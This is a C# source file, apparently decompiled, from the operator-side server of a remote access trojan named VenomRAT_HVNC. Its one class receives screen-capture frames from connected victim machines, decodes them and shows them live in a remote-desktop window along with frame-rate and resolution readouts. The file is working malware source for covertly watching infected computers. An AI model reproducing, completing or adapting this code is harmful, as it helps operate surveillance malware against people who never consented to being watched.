using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Forms;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    public class HandleRemoteDesktop
    {
        public void Capture(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormRemoteDesktop formRemoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
                try
                {
                    if (formRemoteDesktop != null)
                    {
                        if (formRemoteDesktop.Client == null)
                        {
                            formRemoteDesktop.Client = client;
                            formRemoteDesktop.labelWait.Visible = false;
                            formRemoteDesktop.timer1.Start();
                            byte[] asBytes = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                            Bitmap bitmap = formRemoteDesktop.decoder.DecodeData(new MemoryStream(asBytes));
                            formRemoteDesktop.rdSize = bitmap.Size;
                            int num = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
                            formRemoteDesktop.numericUpDown2.Maximum = num - 1;
                        }
                        byte[] asBytes2 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                        object syncPicbox = formRemoteDesktop.syncPicbox;
                        lock (syncPicbox)
                        {
                            using (MemoryStream memoryStream = new MemoryStream(asBytes2))
                            {
                                formRemoteDesktop.GetImage = formRemoteDesktop.decoder.DecodeData(memoryStream);
                            }
                            formRemoteDesktop.pictureBox1.Image = formRemoteDesktop.GetImage;
                            formRemoteDesktop.FPS++;
                            if (formRemoteDesktop.sw.ElapsedMilliseconds >= 1000L)
                            {
                                Control control = formRemoteDesktop;
                                string[] array = new string[10];
                                array[0] = "RemoteDesktop:";
                                array[1] = client.ID;
                                array[2] = "    FPS:";
                                int num2 = 3;
                                int fps = formRemoteDesktop.FPS;
                                array[num2] = fps.ToString();
                                array[4] = "    Screen:";
                                array[5] = formRemoteDesktop.GetImage.Width.ToString();
                                array[6] = " x ";
                                array[7] = formRemoteDesktop.GetImage.Height.ToString();
                                array[8] = "    Size:";
                                array[9] = Methods.BytesToString((long)asBytes2.Length);
                                control.Text = string.Concat(array);
                                formRemoteDesktop.FPS = 0;
                                formRemoteDesktop.sw = Stopwatch.StartNew();
                            }
                            goto IL_1F1;
                        }
                        goto IL_1E9;
                    IL_1F1:
                        goto IL_1F7;
                    }
                IL_1E9:
                    client.Disconnected();
                }
                catch (Exception ex)
                {
                }
            IL_1F7:;
            }
            catch
            {
            }
        }
    }
}
